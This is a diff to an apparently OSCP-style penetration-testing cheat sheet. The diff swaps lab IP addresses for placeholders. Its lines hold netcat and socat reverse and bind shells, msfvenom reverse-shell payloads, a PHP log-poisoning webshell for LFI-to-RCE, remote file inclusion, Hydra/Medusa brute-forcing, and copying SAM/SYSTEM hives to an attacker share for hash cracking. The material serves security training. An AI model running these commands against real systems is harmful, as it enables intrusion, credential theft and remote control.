@@ -604,39 +604,39 @@ export HISTTIMEFORMAT='%F %T '                           Include the date/time i
 
 **Misc Commands**
 ```
-nc -nv 10.11.0.22 110                                                        Connect to a TCP port
-nc -nlvp 4444                                                                Set up a listener
-nc -nv 10.11.0.22 4444                                                       Connect to a listener
-nc -nlvp 4444 > incoming.exe                                                 Receive a file
-nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe      Transfer a file
-nc -nlvp 4444 -e cmd.exe                                                     Set up a bind shell
-nc -nv 10.11.0.22 4444 -e /bin/bash                                          Send a reverse shell
+nc -nv <IP> <port>                                                       Connect to a TCP port
+nc -nlvp <port>                                                          Set up a listener
+nc -nv <IP> <port>                                                       Connect to a listener
+nc -nlvp <port> > incoming.exe                                           Receive a file
+nc -nv <IP> <port> < /usr/share/windows-resources/binaries/wget.exe      Transfer a file
+nc -nlvp <port> -e cmd.exe                                               Set up a bind shell
+nc -nv <IP> <port> -e /bin/bash                                          Send a reverse shell
 ```
 
 **Port Scanning**
 ```
-nc -nvv -w 1 -z 10.11.1.220 3388-3390                        Use netcat to perform a TCP port scan
-nc -nv -u -z -w 1 10.11.1.115 160-162                        Use netcat to perform an UDP port scan
+nc -nvv -w 1 -z <IP> 3388-3390                        Use netcat to perform a TCP port scan
+nc -nv -u -z -w 1 <IP> 160-162                        Use netcat to perform an UDP port scan
 ```
 
 ### <ins>Socat</ins>
 
 **Misc Commands**
 ```
-socat - TCP4:<remote server's ip address>:80                                 Connect to a remote server on port 80
-socat TCP4-LISTEN:443 STDOUT                                                 Create a listener
-socat -d -d TCP4-LISTEN:443 STDOUT                                           Create a listener, -d -d for more verbosity
-socat TCP4-LISTEN:443,fork file:secret.txt                                   Transfer a file
-socat TCP4:10.11.0.4:443 file:received_secret.txt,create                     Receive a file
-socat TCP4:10.11.0.22:443 EXEC:/bin/bash                                     Send a reverse shell
-socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
-socat - OPENSSL:10.11.0.4:443,verify=0                                       Connect to an encrypted bind shell
+socat - TCP4:<remote server's ip address>:80                                    Connect to a remote server on port 80
+socat TCP4-LISTEN:<PORT> STDOUT                                                 Create a listener
+socat -d -d TCP4-LISTEN:<PORT> STDOUT                                           Create a listener, -d -d for more verbosity
+socat TCP4-LISTEN:<PORT>,fork file:secret.txt                                   Transfer a file
+socat TCP4:<IP>:<PORT> file:received_secret.txt,create                          Receive a file
+socat TCP4:<IP>:<PORT> EXEC:/bin/bash                                           Send a reverse shell
+socat OPENSSL-LISTEN:<PORT>,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
+socat - OPENSSL:<IP>:<PORT>,verify=0                                            Connect to an encrypted bind shell
 ```
 
 **Reverse Shell**
 ```
-socat -d -d TCP4-LISTEN:443 STDOUT                                           User 1, create a listener
-socat TCP4:10.11.0.22:443 EXEC:/bin/bash                                     User 2, send reverse shell to User 1
+socat -d -d TCP4-LISTEN:<PORT> STDOUT                                           User 1, create a listener
+socat TCP4:<IP>:<PORT> EXEC:/bin/bash                                     User 2, send reverse shell to User 1
 ```
 
 **Encrypted bind shell with OpenSSL**
@@ -653,8 +653,8 @@ $ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -ou
   -out: save the certificate to a file
 
 $ cat bind_shell.key bind_shell.crt > bind_shell.pem
-$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
-$ socat - OPENSSL:10.11.0.4:443,verify=0                                            Connect to the encrypted bind shell
+$ sudo socat OPENSSL-LISTEN:<PORT>,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
+$ socat - OPENSSL:<IP>:<PORT>,verify=0                                                 Connect to the encrypted bind shell
 ```
 
 ### <ins>PowerShell</ins>
@@ -718,7 +718,7 @@ powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAH
 ### <ins>WireShark</ins>
 
 **Filters**
-- `net 10.11.1.0/24`, capture traffic only on the `10.11.1.0/24` address range
+- `net 10.10.1.0/24`, capture traffic only on the `10.10.1.0/24` address range
 
 **Display filters**
 - `tcp.port == 21`, only display FTP data
@@ -786,7 +786,7 @@ back                                     move out of the current context and ret
 previous                                 switch us back to the previously selected module
 services                                 display the metasploit database logs; -p: filter by port number; -s: service name; -h: help command
 hosts                                    show discovered hosts
-db_nmap 10.11.0.15 -A -Pn                performing a Nmap scan from within Metasploit
+db_nmap <IP> -A -Pn                      performing a Nmap scan from within Metasploit
 workspace                                list workspaces; -a: add a workspace, -d: delete a workspace
 sessions -l                              list all sessions; -i: to interact with a session
 transport list                           list the currently available transports for the meterpreter connection
@@ -1050,41 +1050,41 @@ for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
 
 #### **Netcat**
 ```
-nc -nvv -w 1 -z 10.11.1.220 3388-3390                        Use netcat to perform a TCP port scan
-nc -nv -u -z -w 1 10.11.1.115 160-162                        Use netcat to perform an UDP port scan
+nc -nvv -w 1 -z <IP> 3388-3390                        Use netcat to perform a TCP port scan
+nc -nv -u -z -w 1 <IP> 160-162                        Use netcat to perform an UDP port scan
 ```
 
 #### **Nmap**
 
 ```
-nmap 10.11.1.110                                                     Simple nmap scan
-nmap -p 1-65535 10.11.1.110                                          Scan all the ports
-nmap -sS 10.11.1.110                                                 Stealth / SYN Scanning (will not appear in any application logs)
-nmap -sT 10.11.1.110                                                 TCP connect scan
-nmap -sU 10.11.1.110                                                 UDP scan
-nmap -sS -sU 10.11.1.110                                             Perform a combined UDP and SYN scan
-nmap -sn 10.11.1.110                                                 Perform a network sweep
+nmap <IP>                                                     Simple nmap scan
+nmap -p 1-65535 <IP>                                          Scan all the ports
+nmap -sS <IP>                                                 Stealth / SYN Scanning (will not appear in any application logs)
+nmap -sT <IP>                                                 TCP connect scan
+nmap -sU <IP>                                                 UDP scan
+nmap -sS -sU <IP>                                             Perform a combined UDP and SYN scan
+nmap -sn <IP>                                                 Perform a network sweep
 nmap -p 1-65535 -sV -T4 -Pn -n -vv -iL target.txt -oX out.xml        Discover everything including running services using a list of targets
 nmap -sn <net_address_in_cdr>                                        Check hosts alive, adding -A you gather more info for a target
-nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt      Perform a top twenty port scan, save the output in greppable format
-nmap -O 10.11.1.110                                                  OS fingerprinting
-nmap -sV -sT -A 10.11.1.110                                          Banner Grabbing, Service Enumeration
+nmap -sT -A --top-ports=20 10.10.1.1-254 -oG top-port-sweep.txt      Perform a top twenty port scan, save the output in greppable format
+nmap -O <IP>                                                  OS fingerprinting
+nmap -sV -sT -A <IP>                                          Banner Grabbing, Service Enumeration
 
 Find live hosts
 ---------------
-nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
+nmap -v -sn 10.10.1.1-254 -oG ping-sweep.txt
 grep Up ping-sweep.txt | cut -d " " -f 2
 
 Find web servers using port 80
 ------------------------------
-nmap -p 80 10.11.1.1-254 -oG web-sweep.txt
+nmap -p 80 10.10.1.1-254 -oG web-sweep.txt
 grep open web-sweep.txt | cut -d " " -f 2
 
 
 Nmap Scripting Engine (NSE)
 ---------------------------
 nmap --script-help dns-zone-transfer                                  View information about a script, in this case "dns-zone-transfer"
-nmap 10.11.1.110 --script=smb-os-discovery                            OS fingerprinting (SMB services)
+nmap <IP> --script=smb-os-discovery                                   OS fingerprinting (SMB services)
 nmap --script=dns-zone-transfer -p 53 ns2.zonetransfer.com            Perform a DNS zone transfer
 ```
 
@@ -1115,10 +1115,10 @@ masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1   --rate spe
 
 **Find various nmap SMB NSE scripts**<br/>
 `ls -1 /usr/share/nmap/scripts/smb*`<br/>
-Example: `nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.117`
+Example: `nmap -v -p 139, 445 --script=smb-os-discovery <IP>`
 
 **Determining whether a host is vulnerable to the MS08_067 vulnerability**<br/>
-`nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5`<br/>
+`nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <IP>`<br/>
 Note: the script parameter `unsafe=1`, the scripts that will run are almost guaranteed to crash a vulnerable system
 
 
@@ -1132,14 +1132,14 @@ Note: the script parameter `unsafe=1`, the scripts that will run are almost guar
 
 **Nmap NFS NSE Scripts**<br/>
 `ls -1 /usr/share/nmap/scripts/nfs*`<br/>
-Run all these scripts with `nmap -p 111 --script nfs* 10.11.1.117`
+Run all these scripts with `nmap -p 111 --script nfs* <IP>`
 
 **Example of entire /home directory shared**
 ```
 Mount the directory and access the NFS share
 --------------------------------------------
 mkdir home
-sudo mount -o nolock 10.11.1.72:/home ~/home/
+sudo mount -o nolock <IP>:/home ~/home/
 cd home/ && ls
 
 Add a local user
@@ -1157,7 +1157,7 @@ cat /etc/passwd | grep pwn                               Verify that the changes
 - `EXPN` asks the server for the membership of a mailing list
 
 **Use nc to validate SMTP users**<br/>
-`nc -nv 10.11.1.217 25`
+`nc -nv <IP> 25`
 
 
 ### <ins>SNMP Enumeration</ins>
@@ -1179,13 +1179,13 @@ cat /etc/passwd | grep pwn                               Verify that the changes
 
 Note: Provided we at least know the SNMP read-only community string (in most cases is "public")<br/>
 **Use snmpwalk to enumerate**<br/>
-- The entire MIB tree: `snmpwalk -c public -v1 -t 10 10.11.1.14`
+- The entire MIB tree: `snmpwalk -c public -v1 -t 10 <IP>`
   - `-c`: specify the community string
   - `-v`: specify the SNMP version number
   - `-t 10` to increase the timeout period to 10 seconds
--  Windows users: `snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25`
-- Windows processes: `snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2`
-- Installed software: `snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2`
+-  Windows users: `snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25`
+- Windows processes: `snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2`
+- Installed software: `snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2`
 
 
 ### <ins>HTTP / HTTPS enumeration</ins>
@@ -1517,7 +1517,7 @@ NSE scripts can be found in the `/usr/share/nmap/scripts/` directory. Here you c
 `cat script.db | grep '"vuln"\|"exploit"'`
 
 **Using NSE’s “vuln” scripts**<br/>
-`sudo nmap --script vuln 10.11.1.100`
+`sudo nmap --script vuln <IP>`
 
 ### <ins>Nikto</ins>
 
@@ -1707,9 +1707,9 @@ File inclusion vulnerabilities allow an attacker to include a file into the appl
 
 - **Local File Inclusion (LFI)**: execute a local file
   1. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`. This payload will be saved in the logs
-  2. Perform a LFI with `http://10.11.0.220/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
+  2. Perform a LFI with `http://<IP>/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
 - **Remote File Inclusion (RFI)**: execute a remote file
-  - An example: `http://10.11.0.220/menu.php?file=http://10.11.0.4/evil.php`
+  - An example: `http://<IP>/menu.php?file=http://<IP>/evil.php`
 
 **PHP Wrappers**
 - `?file=data:text/plain,hello world`
@@ -2796,7 +2796,7 @@ If a file is created with a `.hta` extension rather than a `.html` extension, In
 
 **Create a better payload with [msfvenom from the Metasploit framework]([https://github.com/rapid7/metasploit-framework/blob/master/msfvenom](https://github.com/rapid7/metasploit-framework))**<br/>
 ```
-sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+sudo msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o /var/www/html/evil.hta
 
 In evil.hta, the code will find the following command ::> `powershell.exe -nop -w hidden -e aQBmCgAWBJAG4AdAQAHQAcg...`
 
@@ -3213,7 +3213,7 @@ See : ["Open Port Vulnerabilities List by Dirk Schrader"](https://blog.netwrix.c
 #### Medusa, HTTP htaccess Attack
 
 - `medusa -d` All the protocols medusa can interact with
-- ` medusa -h 10.11.0.5 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
+- ` medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
   - `-m` htaccess-protected URL
   - `-h` target host
   - `-u` attack the admin user
@@ -3245,7 +3245,7 @@ SSH Attack
 
 HTTP POST Attack
 - `hydra http-form-post -U`
-- `hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
+- `hydra <IP> http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
   - `-l` user name
   - `-P` wordlist
   - `-vV` verbose output
@@ -3348,7 +3348,7 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
    - `ps aux | grep hts`
    - `ss -antp | grep "1234"`
 3. We need an HTTPTunnel client that will take our remote desktop traffic, encapsulate it into an HTTP stream, and send it to the listening HTTPTunnel server
-   - `htc --forward-port 8080 10.11.0.128:1234`
+   - `htc --forward-port 8080 <IP>:<PORT>`
    - `ps aux | grep htc`
    - `ss -antp | grep "8080"`
 
@@ -3479,7 +3479,7 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
 
 **Wildcards**
 - See [Task 10 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
-- Generate a reverse shell with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
+- Generate a reverse shell with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`
   - make it executable `chmod +x shell.elf`
 - run other commands as part of a checkpoint feature
   - `touch /home/user/--checkpoint=1`
@@ -3623,7 +3623,7 @@ int main () {
 
 #### <ins>Generate a reverse shell</ins>
 1. Generate the reverse shell on your attacker machine: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe`
-2. Transfer it to the Windows machine with SMB: `sudo python3 /opt/impacket/examples/smbserver.py kali .` and then `copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe`
+2. Transfer it to the Windows machine with SMB: `sudo python3 /opt/impacket/examples/smbserver.py kali .` and then `copy \\<IP>\kali\reverse.exe C:\PrivEsc\reverse.exe`
 
 Check also: [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
 
@@ -3762,8 +3762,8 @@ Exploit insecure file permissions on services that run as nt authority\system
 
 **Security Account Manager (SAM)**
 1. The `SAM` and `SYSTEM` files can be used to extract user password hashes. Check also backups of these files
-   - `copy C:\Windows\Repair\SAM \\10.10.10.10\kali\`
-   - `copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
+   - `copy C:\Windows\Repair\SAM \\<IP>\kali\`
+   - `copy C:\Windows\Repair\SYSTEM \\<IP>\kali\`
 2. Dump the hashes with "creddump7": `python3 creddump7/pwdump.py SYSTEM SAM`
 3. Crack the hashes with `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
 
